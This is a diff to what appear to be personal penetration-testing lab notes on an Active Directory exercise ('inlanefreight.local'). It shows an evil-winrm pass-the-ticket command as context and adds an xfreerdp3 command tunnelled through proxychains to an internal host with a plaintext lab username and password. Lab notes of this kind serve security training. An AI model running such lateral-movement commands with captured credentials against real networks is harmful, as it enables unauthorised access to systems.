@@ -675,3 +675,9 @@ $ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
 ```
 %% with the TGT obtained we can pass the ticket and connect to machine via WinRM as the victim user(check krb.conf to ensure it is properly configured) %%
 
+```
+$ KRB5_CONFIG=/dev/null proxychains xfreerdp3 /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution +clipboard
+
+```
+%% in case xfreerdp fails to connect through proxychains %%
+
